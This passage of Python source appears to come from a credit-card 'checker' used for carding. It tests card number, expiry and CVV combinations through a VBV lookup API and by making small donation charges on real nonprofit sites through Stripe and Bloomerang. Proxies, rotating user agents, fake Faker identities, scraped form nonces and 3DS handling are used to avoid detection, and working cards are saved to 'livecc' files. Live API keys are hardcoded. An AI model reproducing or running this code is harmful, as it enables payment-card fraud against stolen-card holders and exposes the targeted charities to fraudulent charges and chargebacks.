    email = f"{Faker().user_name().lower()}_{secrets.token_hex(4)}@{random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'icloud.com', 'proton.me', 'protonmail.com', 'live.com', 'msn.com', 'yahoo.co.id', 'yahoo.co.uk', 'yahoo.co.jp', 'ymail.com', 'rocketmail.com', 'live.uk', 'live.co.uk', 'live.ca', 'outlook.co.uk', 'outlook.jp', 'tutanota.com', 'tutanota.de', 'mailbox.org', 'zoho.com', 'zohomail.com', 'fastmail.com', 'pm.me', 'yandex.com', 'yandex.ru', 'mail.ru', 'gmx.com', 'gmx.de', 'web.de', 'seznam.cz', 'laposte.net', 'orange.fr', 'edumail.vn', 'student.mail', 'alumni.email', 'icousd.com', 'ymail.cc', 'byom.de', 'momoi.re', 'mailgun.co', 'inboxkitten.com', 'maildrop.cc', 'web.de', 'byom.my.id'])}"
    today = datetime.now().strftime('%Y-%m-%d')
    today1 = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    for attempt in range(5):
        try:
            cc, mm, yy, cvv = card.split('|')
            headers = {'Accept': '*/*', 'User-Agent': useragents, 'Cache-Control': 'no-cache', 'Pragma': 'no-cache'}
            url = f'https://api.voidapi.xyz/v2/vbv??key=VDX-SHA2X-NZ0RS-O7HAM&card={cc}|{mm}|{yy}|{cvv}'
            r = ses.get(url, headers=headers)
            text = r.text.strip()
            live = ['authenticate_successful', 'authenticate_attempt_successful', 'authentication_successful', 'authentication_attempt_successful', 'three_d_secure_passed', 'three_d_secure_authenticated', 'three_d_secure_attempted', 'liability_shifted', 'liability_shift_possible', 'frictionless_flow', 'challenge_not_required']
            status = gstr(text, 'status":"', '"') or 'Card type not support.'
            if '524: A timeout occurred' in text:
                if attempt < 4:
                    log_line(f'    {LMAGENTA}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LMAGENTA}RETRY {LWHITE}--> {LMAGENTA}Card processing error. Try again later.{RESET_ALL}')
                    time.sleep(7)
                    continue
                log_line(f'    {LRED}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LRED}MAXRETRY {LWHITE}--> {LRED}Maximum retry limit reached.{RESET_ALL}')
                return None
            if status in live:
                log_line(f'    {LGREEN}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LGREEN}LIVE {LWHITE}--> {LGREEN}{status}{RESET_ALL}')
                with open('livecc_nonvbv.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{cc}|{mm}|{yy}|{cvv} -[{today1}] -> {status}\n')
                    f.flush()
                return True
            log_line(f'    {LRED}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LRED}DECLINED {LWHITE}--> {LRED}{status}{RESET_ALL}')
            return False
        except ProxyError as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except SSLError as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except (ConnectionError, Timeout, socket.timeout) as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except HTTPError as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except TooManyRedirects as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except (ChunkedEncodingError, ContentDecodingError) as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except (InvalidURL, InvalidSchema) as e:
            log_line(f'    {LMAGENTA}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LMAGENTA}ERROR {LWHITE}--> {LMAGENTA}Invalid request URL.{RESET_ALL}')
            return None
        except RequestException as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        finally:
            ses.close()

def chrgeccn(card: str, proxy: Optional[str]=None) -> Optional[bool]:
    ses = requests.Session()
    _proxy_manager.apply_to_session(ses)
    fake = Faker('en_US')
    chars = string.ascii_letters + string.digits + string.punctuation
    password = ''.join((secrets.choice(chars) for _ in range(12)))
    if UserAgent:
        ua = UserAgent(platforms='mobile')
        useragents = ua.random
    else:
        useragents = random.choice(USA)
    current_proxy = _proxy_manager.get_current_proxy()
    fingerprintId = __import__('hashlib').sha256(f"{useragents}|{current_proxy or ''}".encode()).hexdigest()
    firstname = fake.first_name()
    lastname = fake.last_name()
    fullname = f'{firstname} {lastname}'
    zipcode = fake.postcode()
    try:
        zipcode = fake.zipcode()
    except Exception:
        zipcode = fake.postalcode()
    email = f"{Faker().user_name().lower()}_{secrets.token_hex(4)}@{random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'icloud.com', 'proton.me', 'protonmail.com', 'live.com', 'msn.com', 'yahoo.co.id', 'yahoo.co.uk', 'yahoo.co.jp', 'ymail.com', 'rocketmail.com', 'live.uk', 'live.co.uk', 'live.ca', 'outlook.co.uk', 'outlook.jp', 'tutanota.com', 'tutanota.de', 'mailbox.org', 'zoho.com', 'zohomail.com', 'fastmail.com', 'pm.me', 'yandex.com', 'yandex.ru', 'mail.ru', 'gmx.com', 'gmx.de', 'web.de', 'seznam.cz', 'laposte.net', 'orange.fr', 'edumail.vn', 'student.mail', 'alumni.email', 'icousd.com', 'ymail.cc', 'byom.de', 'momoi.re', 'mailgun.co', 'inboxkitten.com', 'maildrop.cc', 'web.de', 'byom.my.id'])}"
    today = datetime.now().strftime('%Y-%m-%d')
    timeunix = int(time.time() * 1000)
    today1 = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    APIKEY11 = 'pk_live_iZYXFefCkt380zu63aqUIo7y'
    for attempt in range(5):
        try:
            cc, mm, yy, cvv = card.split('|')
            mm = mm.zfill(2)
            yy = yy[-2:].zfill(2)
            cvv = cvv[:4]
            headers = {'accept': '*/*', 'accept-language': 'en-US,en;q=0.6', 'cache-control': 'no-cache', 'content-type': 'application/json; charset=UTF-8', 'origin': 'https://www.quincyfamilyrc.org', 'pragma': 'no-cache', 'priority': 'u=1, i', 'referer': 'https://www.quincyfamilyrc.org/', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'cross-site', 'sec-gpc': '1', 'user-agent': useragents}
            params = {'ApiKey': 'pub_fa6f55a1-d391-11eb-ab84-0253c981a9f9'}
            json_data = {'ServedSecurely': True, 'FormUrl': 'https://www.quincyfamilyrc.org/donate/', 'Logs': []}
            r = ses.post('https://api.bloomerang.co/v1/Widget/3729409', params=params, headers=headers, json=json_data)
            txt = r.text
            pi_ = gstr(txt, 'PaymentIntentId":"', '"')
            ClientSecret = gstr(txt, 'ClientSecret":"', '"')
            StripeAccountId = gstr(txt, 'StripeAccountId":"', '"')
            CustomerId = gstr(txt, 'CustomerId":"', '"')
            headers = {'accept': 'application/json', 'accept-language': 'en-US,en;q=0.6', 'cache-control': 'no-cache', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'pragma': 'no-cache', 'priority': 'u=1, i', 'referer': 'https://js.stripe.com/', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'sec-gpc': '1', 'user-agent': useragents}
            data = {'return_url': 'https://www.quincyfamilyrc.org/donate/', 'payment_method_data[type]': 'card', 'payment_method_data[card][number]': cc, 'payment_method_data[card][cvc]': cvv, 'payment_method_data[card][exp_year]': yy, 'payment_method_data[card][exp_month]': mm, 'payment_method_data[billing_details][address][country]': 'US', 'payment_method_data[billing_details][address][postal_code]': zipcode, 'payment_method_data[allow_redisplay]': 'unspecified', 'payment_method_data[pasted_fields]': 'number,cvc', 'payment_method_data[payment_user_agent]': 'stripe.js/94528a98b2; stripe-js-v3/94528a98b2; payment-element', 'payment_method_data[referrer]': 'https://www.quincyfamilyrc.org', 'payment_method_data[time_on_page]': '96177', 'payment_method_data[client_attribution_metadata][client_session_id]': '5971098d-a3fa-4928-8fe0-4c3babdd1861', 'payment_method_data[client_attribution_metadata][merchant_integration_source]': 'elements', 'payment_method_data[client_attribution_metadata][merchant_integration_subtype]': 'payment-element', 'payment_method_data[client_attribution_metadata][merchant_integration_version]': '2021', 'payment_method_data[client_attribution_metadata][payment_intent_creation_flow]': 'standard', 'payment_method_data[client_attribution_metadata][payment_method_selection_flow]': 'automatic', 'payment_method_data[client_attribution_metadata][elements_session_config_id]': '08545f0c-5d60-481b-a5de-62341ce06cca', 'payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]': 'payment', 'payment_method_data[guid]': str(uuid.uuid4()), 'payment_method_data[muid]': str(uuid.uuid4()), 'payment_method_data[sid]': str(uuid.uuid4()), 'expected_payment_method_type': 'card', 'use_stripe_sdk': 'true', 'key': APIKEY11, 'client_attribution_metadata[client_session_id]': '5971098d-a3fa-4928-8fe0-4c3babdd1861', 'client_attribution_metadata[merchant_integration_source]': 'elements', 'client_attribution_metadata[merchant_integration_subtype]': 'payment-element', 'client_attribution_metadata[merchant_integration_version]': '2021', 'client_attribution_metadata[payment_intent_creation_flow]': 'standard', 'client_attribution_metadata[payment_method_selection_flow]': 'automatic', 'client_attribution_metadata[elements_session_config_id]': '08545f0c-5d60-481b-a5de-62341ce06cca', 'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment', 'client_secret': ClientSecret}
            r = ses.post(f'https://api.stripe.com/v1/payment_intents/{pi_}/confirm', headers=headers, data=data)
            response_text = r.text
            try:
                resp = json.loads(response_text)
            except:
                resp = {}
            err = resp.get('error') or {}
            last = (err.get('payment_intent') or {}).get('last_payment_error') or {}
            status = gstr(response_text, '"status": "', '"')
            decline_code = last.get('decline_code') or last.get('code') or err.get('decline_code') or err.get('code')
            message = last.get('message') or err.get('message')
            if decline_code:
                log_line(f'    {LRED}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LRED}{decline_code.upper()} {LWHITE}--> {LRED}{message}{RESET_ALL}')
                return False
            if status == 'succeeded':
                log_line(f'    {LGREEN}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LGREEN}APPROVED {LWHITE}--> {LGREEN}Card approved.{RESET_ALL}')
                with open('livecc_stripe3.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{cc}|{mm}|{yy}|{cvv} -[{today1}] -> SUCCEEDED\n')
                    f.flush()
                return True
            if status == 'requires_action':
                three_d_secure_2_source = resp.get('next_action', {}).get('use_stripe_sdk', {}).get('three_d_secure_2_source')
                headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'cache-control': 'no-cache', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://geoissuer.cardinalcommerce.com', 'pragma': 'no-cache', 'priority': 'u=0, i', 'referer': 'https://geoissuer.cardinalcommerce.com/', 'user-agent': useragents}
                data = {'threeDSMethodData': 'eyJ0aHJlZURTU2VydmVyVHJhbnNJRCI6ImMxMmU5NmRhLWY0OWUtNDc1Yi05NzMyLTZkYWNjOTJkZTdhMCJ9'}
                r = ses.post(f'https://hooks.stripe.com/3d_secure_2/fingerprint/{StripeAccountId}/{three_d_secure_2_source}', headers=headers, data=data)
                headers = {'accept': 'application/json', 'cache-control': 'no-cache', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'pragma': 'no-cache', 'priority': 'u=1, i', 'referer': 'https://js.stripe.com/', 'user-agent': useragents}
                browser_data = {'fingerprintAttempted': True, 'challengeWindowSize': None, 'threeDSCompInd': 'Y', 'browserJavaEnabled': False, 'browserJavascriptEnabled': True, 'browserLanguage': 'en-GB', 'browserColorDepth': '24', 'browserScreenHeight': '1080', 'browserScreenWidth': '1920', 'browserTZ': '0', 'browserUserAgent': str(useragents)}
                browser_json = json.dumps(browser_data)
                browser_encoded = quote_plus(browser_json)
                data = f'source={three_d_secure_2_source}&browser={browser_encoded}&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=false&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key={APIKEY11}&_stripe_version=2024-06-20'
                r = ses.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers, data=data)
                headers = {'accept': 'application/json', 'cache-control': 'no-cache', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'pragma': 'no-cache', 'priority': 'u=1, i', 'referer': 'https://js.stripe.com/', 'user-agent': useragents}
                params = {'is_stripe_sdk': 'false', 'client_secret': ClientSecret, 'key': APIKEY11, '_stripe_version': '2024-06-20'}
                r = ses.get(f'https://api.stripe.com/v1/payment_intents/{pi_}', params=params, headers=headers)
                response_text = r.text
                try:
                    resp = json.loads(response_text)
                except:
                    resp = {}
                err = resp.get('error') or {}
                pi_data = err.get('payment_intent') or {}
                status = resp.get('status') or err.get('status') or gstr(response_text, '"status":"', '"')
                last = pi_data.get('last_payment_error') or {}
                decline_code = last.get('decline_code') or last.get('code') or err.get('decline_code') or err.get('code')
                message = last.get('message') or err.get('message') or 'Unknown error'
                if status == 'succeeded':
                    log_line(f'    {LGREEN}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LGREEN}APPROVED {LWHITE}--> {LGREEN}Card approved.{RESET_ALL}')
                    with open('livecc_stripe3.txt', 'a', encoding='utf-8') as f:
                        f.write(f'{cc}|{mm}|{yy}|{cvv} -[{today1}] -> SUCCEEDED\n')
                        f.flush()
                    return True
                elif status in ('requires_action', 'requires_payment_method'):
                    log_line(f'    {LYELLOW}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LYELLOW}THREE3DS {LWHITE}--> {LYELLOW}Card need requires action 3Ds.{RESET_ALL}')
                    return False
                elif decline_code:
                    log_line(f'    {LRED}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LRED}{decline_code.upper()} {LWHITE}--> {LRED}{message}{RESET_ALL}')
                    return False
                elif attempt == 4:
                    log_line(f'    {LRED}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LRED}MAXRETRY {LWHITE}--> {LRED}Maximum retry limit reached.{RESET_ALL}')
                    return None
        except ProxyError as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except SSLError as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except (ConnectionError, Timeout, socket.timeout) as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except HTTPError as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except TooManyRedirects as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except (ChunkedEncodingError, ContentDecodingError) as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except (InvalidURL, InvalidSchema) as e:
            log_line(f'    {LMAGENTA}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LMAGENTA}ERROR {LWHITE}--> {LMAGENTA}Invalid request URL.{RESET_ALL}')
            return None
        except RequestException as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        finally:
            ses.close()
US_STATES = ['AL', 'AK', 'AZ', 'AR', 'CA', 'CO', 'CT', 'DE', 'FL', 'GA', 'HI', 'ID', 'IL', 'IN', 'IA', 'KS', 'KY', 'LA', 'ME', 'MD', 'MA', 'MI', 'MN', 'MS', 'MO', 'MT', 'NE', 'NV', 'NH', 'NJ', 'NM', 'NY', 'NC', 'ND', 'OH', 'OK', 'OR', 'PA', 'RI', 'SC', 'SD', 'TN', 'TX', 'UT', 'VT', 'VA', 'WA', 'WV', 'WI', 'WY']

def stripe1xx(card: str, proxy: Optional[str]=None) -> Optional[bool]:
    ses = requests.Session()
    _proxy_manager.apply_to_session(ses)
    fake = Faker('en_US')
    chars = string.ascii_letters + string.digits + string.punctuation
    password = ''.join((secrets.choice(chars) for _ in range(12)))
    UserAgent = random.choice(USA)
    current_proxy = _proxy_manager.get_current_proxy()
    fingerprintId = __import__('hashlib').sha256(f"{UserAgent}|{current_proxy or ''}".encode()).hexdigest()
    firstname = fake.first_name()
    lastname = fake.last_name()
    fullname = f'{firstname} {lastname}'
    street = fake.street_address()
    city = fake.city()
    state = random.choice(US_STATES)
    area_code = random.randint(200, 999)
    exchange = random.randint(200, 999)
    subscriber = random.randint(1000, 9999)
    phoneNumber = f'1{area_code}{exchange}{subscriber}'
    zipcode = fake.postcode()
    try:
        zipcode = fake.zipcode()
    except Exception:
        zipcode = fake.postalcode()
    email = f"{Faker().user_name().lower()}_{secrets.token_hex(4)}@{random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'icloud.com', 'proton.me', 'protonmail.com', 'live.com', 'msn.com', 'yahoo.co.id', 'yahoo.co.uk', 'yahoo.co.jp', 'ymail.com', 'rocketmail.com', 'live.uk', 'live.co.uk', 'live.ca', 'outlook.co.uk', 'outlook.jp', 'tutanota.com', 'tutanota.de', 'mailbox.org', 'zoho.com', 'zohomail.com', 'fastmail.com', 'pm.me', 'yandex.com', 'yandex.ru', 'mail.ru', 'gmx.com', 'gmx.de', 'web.de', 'seznam.cz', 'laposte.net', 'orange.fr', 'edumail.vn', 'student.mail', 'alumni.email', 'icousd.com', 'ymail.cc', 'byom.de', 'momoi.re', 'mailgun.co', 'inboxkitten.com', 'maildrop.cc', 'web.de', 'byom.my.id'])}"
    today = datetime.now().strftime('%Y-%m-%d')
    timeunix = int(time.time() * 1000)
    today1 = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    date = f'{datetime.now().month}/{datetime.now().day}/{datetime.now().year}'
    for attempt in range(5):
        try:
            cc, mm, yy, cvv = card.split('|')
            mm = mm.zfill(2)
            yy = yy[-2:].zfill(2)
            cvv = cvv[:4]
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', 'accept-language': 'en-US,en;q=0.9,id;q=0.8', 'cache-control': 'no-cache', 'pragma': 'no-cache', 'priority': 'u=0, i', 'referer': 'https://www.google.com/', 'user-agent': UserAgent}
            response = ses.get('https://healingstepscounseling.net/one-time-donation/', headers=headers)
            config_nonce = response.text.split('"config_nonce":"')[1].split('"')[0]
            hashnonce = response.text.split('gravity-theme&amp;styles=[]&amp;hash=')[1].split("'")[0]
            gformNonce = response.text.split("gform_currency' data-currency='USD' value='")[1].split("'")[0]
            state12 = response.text.split("gform_hidden' name='state_12' value='")[1].split("'")[0]
            subscriptionNonce = response.text.split('create_subscription_nonce":"')[1].split('"')[0]
            versionHash = response.text.split('"version_hash":"')[1].split('"')[0]
            ajaxSubmitNonce = response.text.split('"ajax_submission_nonce":"')[1].split('"')[0]
            getCountryCodeNonce = response.text.split('"get_country_code_nonce":"')[1].split('"')[0]
            submissionSpeeds = response.text.split("'{&quot;pages&quot;:{&quot;1&quot;:['")[1].split(']}}')[0]
            if not config_nonce and hashnonce and gformNonce and state12:
                if attempt == 4:
                    log_line(f'    {LMAGENTA}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LMAGENTA}ERROR {LWHITE}--> {LMAGENTA}Site unavailable. Max retry reached.{RESET_ALL}')
                    return None
                log_line(f'    {LMAGENTA}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LMAGENTA}RETRY {LWHITE}--> {LMAGENTA}Site unavailable. retrying...{RESET_ALL}')
                time.sleep(random.uniform(4, 20))
                continue
            headers = {'accept': '*/*', 'accept-language': 'en-US,en;q=0.9,id;q=0.8', 'cache-control': 'no-cache', 'origin': 'https://healingstepscounseling.net', 'pragma': 'no-cache', 'priority': 'u=1, i', 'referer': 'https://healingstepscounseling.net/one-time-donation/', 'user-agent': UserAgent}
            payload = {'gform_ajax_nonce': (None, config_nonce), 'action': (None, 'gform_get_config'), 'args': (None, '{"form_ids":[12]}'), 'config_path': (None, 'gform_theme_config/common/form/pagination/12'), 'query_string': (None, '')}
            response = ses.post('https://healingstepscounseling.net/wp-admin/admin-ajax.php', headers=headers, data=payload)
            payload1 = {'gform_ajax_nonce': (None, config_nonce), 'action': (None, 'gform_get_config'), 'args': (None, '{"form_ids":[12]}'), 'config_path': (None, 'gform_theme_config/addon/stripe/elements/12'), 'query_string': (None, '')}
            response = ses.post('https://healingstepscounseling.net/wp-admin/admin-ajax.php', headers=headers, data=payload1)
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', 'accept-language': 'en-US,en;q=0.9,id;q=0.8', 'cache-control': 'no-cache', 'origin': 'https://healingstepscounseling.net', 'pragma': 'no-cache', 'priority': 'u=0, i', 'referer': 'https://healingstepscounseling.net/one-time-donation/', 'user-agent': UserAgent}
            payload2 = {'ak_hp_textarea': (None, ''), 'ak_js': (None, timeunix), 'input_23': (None, ''), 'input_19': (None, 'Other|0'), 'input_11': (None, '$5.00'), 'input_22': (None, 'No'), 'input_7.3': (None, ''), 'input_7.6': (None, ''), 'input_9': (None, ''), 'input_20': (None, ''), 'input_14.1': (None, ''), 'input_14.2': (None, ''), 'input_14.3': (None, ''), 'input_14.4': (None, 'Illinois'), 'input_14.5': (None, ''), 'input_14.6': (None, 'US'), 'input_3': (None, '$5.00'), 'input_17.5': (None, ''), 'gform_ajax': (None, f'form_id=12&title=1&description=1&tabindex=0&theme=gravity-theme&styles=[]&hash={hashnonce}'), 'gform_submission_method': (None, 'iframe'), 'gform_theme': (None, 'gravity-theme'), 'gform_style_settings': (None, '[]'), 'is_submit_12': (None, '1'), 'gform_submit': (None, '12'), 'gform_currency': (None, gformNonce), 'gform_unique_id': (None, ''), 'state_12': (None, state12), 'gform_target_page_number_12': (None, '2'), 'gform_source_page_number_12': (None, '1'), 'gform_field_values': (None, ''), 'gform_submission_speeds': (None, f'{{"pages":{{"1":[{{{submissionSpeeds}}}]}}}}')}
            response = ses.post('https://healingstepscounseling.net/one-time-donation/', headers=headers, data=payload2)
            gformUniqueNonce = response.text.split("name='gform_unique_id' value='")[1].split("'")[0]
            hashnonce = response.text.split('gravity-theme&amp;styles=[]&amp;hash=')[1].split("'")[0]
            gformNonce = response.text.split("name='gform_currency' data-currency='USD' value='")[1].split("'")[0]
            state12 = response.text.split("gform_hidden' name='state_12' value='")[1].split("'")[0]
            submissionSpeeds = response.text.split("'{&quot;pages&quot;:{&quot;1&quot;:['")[1].split(']}}')[0]
            if not gformUniqueNonce and hashnonce and gformNonce and state12:
                if attempt == 4:
                    log_line(f'    {LMAGENTA}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LMAGENTA}ERROR {LWHITE}--> {LMAGENTA}Site unavailable. Max retry reached.{RESET_ALL}')
                    return None
                log_line(f'    {LMAGENTA}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LMAGENTA}RETRY {LWHITE}--> {LMAGENTA}Site unavailable. retrying...{RESET_ALL}')
                time.sleep(random.uniform(4, 20))
                continue
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', 'accept-language': 'en-US,en;q=0.9,id;q=0.8', 'cache-control': 'no-cache', 'origin': 'https://healingstepscounseling.net', 'pragma': 'no-cache', 'priority': 'u=0, i', 'referer': 'https://healingstepscounseling.net/one-time-donation/', 'user-agent': UserAgent}
            payload3 = {'ak_hp_textarea': (None, ''), 'ak_js': (None, timeunix), 'input_23': (None, ''), 'input_19': (None, 'Other|0'), 'input_11': (None, '$5.00'), 'input_22': (None, 'No'), 'input_7.3': (None, firstname), 'input_7.6': (None, lastname), 'input_9': (None, email), 'input_20': (None, '(907) 523-5680'), 'input_14.1': (None, ''), 'input_14.2': (None, ''), 'input_14.3': (None, ''), 'input_14.4': (None, 'Illinois'), 'input_14.5': (None, ''), 'input_14.6': (None, 'US'), 'input_3': (None, '$5.00'), 'input_17.5': (None, ''), 'gform_ajax': (None, f'form_id=12&title=1&description=1&tabindex=0&theme=gravity-theme&styles=[]&hash={hashnonce}'), 'gform_submission_method': (None, 'iframe'), 'gform_theme': (None, 'gravity-theme'), 'gform_style_settings': (None, '[]'), 'is_submit_12': (None, '1'), 'gform_submit': (None, '12'), 'gform_currency': (None, gformNonce), 'gform_unique_id': (None, gformUniqueNonce), 'state_12': (None, state12), 'gform_target_page_number_12': (None, '3'), 'gform_source_page_number_12': (None, '2'), 'gform_field_values': (None, ''), 'gform_submission_speeds': (None, f'{{"pages":{{"2":[{submissionSpeeds}]}}}}')}
            response = ses.post('https://healingstepscounseling.net/one-time-donation/', headers=headers, data=payload3)
            gformUniqueNonce = response.text.split("name='gform_unique_id' value='")[1].split("'")[0]
            hashnonce = response.text.split('gravity-theme&amp;styles=[]&amp;hash=')[1].split("'")[0]
            gformNonce = response.text.split("name='gform_currency' data-currency='USD' value='")[1].split("'")[0]
            state12 = response.text.split("gform_hidden' name='state_12' value='")[1].split("'")[0]
            headers = {'accept': '*/*', 'accept-language': 'en-US,en;q=0.9,id;q=0.8', 'cache-control': 'no-cache', 'origin': 'https://healingstepscounseling.net', 'pragma': 'no-cache', 'priority': 'u=1, i', 'referer': 'https://healingstepscounseling.net/one-time-donation/', 'user-agent': UserAgent}
            payload4 = {'ak_hp_textarea': (None, ''), 'ak_js': (None, timeunix), 'input_23': (None, ''), 'input_19': (None, 'Other|0'), 'input_11': (None, '$5.00'), 'input_22': (None, 'No'), 'input_7.3': (None, firstname), 'input_7.6': (None, lastname), 'input_9': (None, email), 'input_20': (None, '(907) 523-5680'), 'input_14.1': (None, '23475 Glacier View Dr'), 'input_14.2': (None, ''), 'input_14.3': (None, 'Eagle River'), 'input_14.4': (None, 'Alaska'), 'input_14.5': (None, '99577'), 'input_14.6': (None, 'US'), 'input_3': (None, '$5.00'), 'input_17.5': (None, f'{firstname} {lastname}'), 'gform_submission_method': (None, 'ajax'), 'gform_theme': (None, 'gravity-theme'), 'gform_style_settings': (None, '[]'), 'is_submit_12': (None, '1'), 'gform_submit': (None, '12'), 'gform_currency': (None, gformNonce), 'gform_unique_id': (None, gformUniqueNonce), 'state_12': (None, state12), 'gform_target_page_number_12': (None, '0'), 'gform_source_page_number_12': (None, '3'), 'gform_field_values': (None, ''), 'version_hash': (None, versionHash), 'gform_submission_speeds': (None, f'{{"pages":{{"3":[{submissionSpeeds}]}}}}'), 'gform_ajax_nonce': (None, ajaxSubmitNonce), 'action': (None, 'gform_submit_form'), 'form_id': (None, '12'), 'current_page_url': (None, 'https%3A%2F%2Fhealingstepscounseling.net%2Fone-time-donation%2F'), 'ajax_referer': (None, 'https%3A%2F%2Fwww.google.com%2F'), 'display_title': (None, '1'), 'display_description': (None, '1')}
            response = ses.post('https://healingstepscounseling.net/wp-admin/admin-ajax.php', headers=headers, data=payload4)
            headers = {'accept': '*/*', 'accept-language': 'en-US,en;q=0.9,id;q=0.8', 'cache-control': 'no-cache', 'origin': 'https://healingstepscounseling.net', 'pragma': 'no-cache', 'priority': 'u=1, i', 'referer': 'https://healingstepscounseling.net/one-time-donation/', 'user-agent': UserAgent}
            data1 = {'action': (None, 'gfstripe_elements_create_subscription'), 'nonce': (None, subscriptionNonce), 'entry_id': (None, '347684'), 'feed_id': (None, '3')}
            response = ses.post('https://healingstepscounseling.net/wp-admin/admin-ajax.php', headers=headers, data=data1)
            txt = response.text
            paymentId = gstr(txt, 'payment_intent":{"id":"', '"')
            clientSecret = gstr(txt, '"client_secret":"', '"')
            headers = {'accept': '*/*', 'accept-language': 'en-US,en;q=0.9,id;q=0.8', 'cache-control': 'no-cache', 'origin': 'https://healingstepscounseling.net', 'pragma': 'no-cache', 'priority': 'u=1, i', 'referer': 'https://healingstepscounseling.net/one-time-donation/', 'user-agent': UserAgent}
            data2 = {'action': (None, 'gfstripe_elements_get_country_code'), 'nonce': (None, getCountryCodeNonce), 'country': (None, 'US')}
            response = requests.post('https://healingstepscounseling.net/wp-admin/admin-ajax.php', headers=headers, data=data2)
            headers = {'accept': 'application/json', 'accept-language': 'en-US,en;q=0.9,id;q=0.8', 'cache-control': 'no-cache', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'pragma': 'no-cache', 'priority': 'u=1, i', 'referer': 'https://js.stripe.com/', 'user-agent': UserAgent}
            post_data = {'payment_method_data[type]': 'card', 'payment_method_data[billing_details][name]': f'{firstname} {lastname}', 'payment_method_data[billing_details][address][line1]': '23475 Glacier View Dr', 'payment_method_data[billing_details][address][line2]': '', 'payment_method_data[billing_details][address][city]': 'Eagle River', 'payment_method_data[billing_details][address][state]': 'Alaska', 'payment_method_data[billing_details][address][postal_code]': zipcode, 'payment_method_data[billing_details][address][country]': 'US', 'payment_method_data[card][number]': cc, 'payment_method_data[card][cvc]': cvv, 'payment_method_data[card][exp_month]': mm, 'payment_method_data[card][exp_year]': yy, 'payment_method_data[guid]': 'N/A', 'payment_method_data[muid]': 'N/A', 'payment_method_data[sid]': 'N/A', 'payment_method_data[pasted_fields]': 'number,cvc', 'payment_method_data[payment_user_agent]': 'stripe.js/b0f5e7abe5; stripe-js-v3/b0f5e7abe5; card-element', 'payment_method_data[referrer]': 'https://healingstepscounseling.net', 'payment_method_data[time_on_page]': '122061', 'payment_method_data[client_attribution_metadata][client_session_id]': 'e9f1524f-316f-4a35-b5fb-6219ea09e0fa', 'payment_method_data[client_attribution_metadata][merchant_integration_source]': 'elements', 'payment_method_data[client_attribution_metadata][merchant_integration_subtype]': 'card-element', 'payment_method_data[client_attribution_metadata][merchant_integration_version]': '2017', 'payment_method_data[client_attribution_metadata][wallet_config_id]': 'b38d93f8-2c55-4da0-aee3-9b28790c8570', 'expected_payment_method_type': 'card', 'use_stripe_sdk': 'true', 'key': 